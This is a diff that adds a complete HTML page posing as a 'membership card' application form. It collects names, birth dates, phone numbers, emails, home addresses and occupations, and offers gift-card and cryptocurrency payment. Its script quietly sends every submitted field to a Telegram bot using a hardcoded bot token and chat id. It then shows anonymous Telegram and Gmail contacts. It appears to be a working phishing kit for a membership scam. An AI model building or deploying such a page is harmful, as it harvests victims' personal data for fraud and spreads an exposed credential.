@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Get Membership Card</title>
+  <style>
+    body {
+      background: #121212;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      padding: 20px;
+      margin: 0;
+    }
+    form {
+      max-width: 700px;
+      margin: auto;
+      background: #1e1e1e;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
+    }
+    h2 {
+      text-align: center;
+      color: gold;
+      font-size: 2.5em;
+      font-family: 'Georgia', serif;
+      margin-bottom: 20px;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 8px;
+      background: #333;
+      color: white;
+      font-size: 1em;
+    }
+    input::placeholder, select::placeholder {
+      color: #b0b0b0;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #FFD700, #FF8C00);
+      color: black;
+      font-size: 1.2em;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .submit-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px rgba(255, 140, 0, 0.7);
+    }
+    #contactOptions {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+      background: #333;
+      padding: 20px;
+      border-radius: 8px;
+    }
+    .contact-icon {
+      width: 60px;
+      margin: 10px;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+    .contact-icon:hover {
+      transform: scale(1.1);
+    }
+  </style>
+</head>
+<body>
+
+  <form id="membershipForm">
+    <h2>Membership Application Form</h2>
+    <input type="text" name="name" placeholder="Full Name" required>
+    <input type="date" name="dob" placeholder="Date of Birth" required>
+    <select name="gender" required>
+      <option value="">Select Gender</option>
+      <option>Male</option>
+      <option>Female</option>
+    </select>
+    <input type="tel" name="phone" placeholder="Phone Number" required>
+    <input type="email" name="email" placeholder="Email Address" required>
+    <input type="text" name="address" placeholder="Home Address" required>
+    <input type="text" name="occupation" placeholder="Occupation" required>
+    <input type="text" name="country" placeholder="Country" required>
+    <select name="card" required>
+      <option value="">Select Membership Card</option>
+      <option>Gold</option>
+      <option>Silver</option>
+      <option>Platinum</option>
+      <option>Diamond</option>
+    </select>
+    <select name="payment" required>
+      <option value="">Payment Method</option>
+      <option>PayPal</option>
+      <option>Cash App</option>
+      <option>Gift Card</option>
+      <option>Cryptocurrency</option>
+    </select>
+    <input type="date" name="applicationDate" required placeholder="Date of Application">
+    <button type="submit" class="submit-btn">Apply Now</button>
+
+    <div id="contactOptions">
+      <p style="color: gold;">Choose how to contact the management:</p>
+      <a href="https://t.me/official_management0098" target="_blank">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="contact-icon" alt="Telegram">
+      </a>
+      <a href="mailto:management335778888@gmail.com?subject=Membership%20Application" target="_blank">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg" class="contact-icon" alt="Email">
+      </a>
+    </div>
+  </form>
+
+  <script>
+    const form = document.getElementById("membershipForm");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const botToken = "8151429137:AAEZb095wNIkxujeKqXIzXWHycNaIOB15_0";
+      const chatId = "-4610787970";
+
+      const formData = new FormData(form);
+      let message = "New Membership Application:\n\n";
+      formData.forEach((value, key) => {
+        message += `${key.toUpperCase()}: ${value}\n`;
+      });
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => {
+        if (response.ok) {
+          alert("Application submitted successfully!");
+          document.getElementById('contactOptions').style.display = 'block';
+          form.reset();
+        } else {
+          alert("Failed to submit application. Try again later.");
+        }
+      }).catch(error => {
+        alert("An error occurred. Check your internet or bot setup.");
+      });
+    });
+  </script>
+
+</body>
+</html>
